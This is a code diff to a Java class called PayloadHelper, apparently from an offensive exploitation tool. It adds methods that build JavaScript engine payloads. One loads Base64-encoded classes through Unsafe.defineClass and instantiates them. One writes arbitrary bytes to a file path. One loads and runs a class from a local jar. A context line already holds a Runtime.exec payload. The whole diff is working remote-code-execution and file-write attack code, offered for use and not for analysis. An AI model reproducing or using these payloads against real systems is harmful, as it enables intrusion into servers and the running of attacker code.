@@ -233,6 +233,13 @@ public class PayloadHelper {
                 "java.lang.Runtime.getRuntime().exec(strs);";
     }
 
+    /**
+     * ClassDefiner会新起一个独立的classloader环境，所以可能存在classnotfound的问题
+     * 不稳定，用后面的makeJsDefinedClass2
+     * @param classname
+     * @param encoded
+     * @return
+     */
     public static String makeJsDefinedClass(String classname, String encoded){
         return "var data = '"+encoded+"';" +
                 "var bytes = java.util.Base64.getDecoder().decode(data);" +
@@ -243,6 +250,30 @@ public class PayloadHelper {
                 "evil.newInstance();";
     }
 
+    public static String makeJsDefinedClass2(String classname, String encoded){
+        return "var data = '"+encoded+"';" +
+                "var bytes = java.util.Base64.getDecoder().decode(data);" +
+                "var cls = java.lang.Class.forName('sun.nio.ch.Util');" +
+                "var method = cls.getDeclaredMethod('unsafe');" +
+                "method.setAccessible(true);" +
+                "var unsafe = method.invoke(cls);" +
+                "var evil = unsafe.defineClass('"+classname+"', bytes, 0, bytes.length, java.lang.ClassLoader.getSystemClassLoader(), null);" +
+                "evil.newInstance();";
+    }
+
+    public static String makeJsFileWrite(String filepath, String encoded){
+        return "var data = '"+encoded+"';" +
+                "var bytes = java.util.Base64.getDecoder().decode(data);" +
+                "com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename('"+filepath+"',bytes);";
+    }
+
+    public static String makeJsLoadJar(String filepath, String classname){
+        return "var args = new Array(1);" +
+                "args[0] = new java.net.URL('file://"+filepath+"');" +
+                "var classloader = new java.net.URLClassLoader(args);" +
+                "var cls = classloader.loadClass('"+classname+"');" +
+                "cls.newInstance();";
+    }
 
     /**
      * from readObject ot obj.toString in jdk8
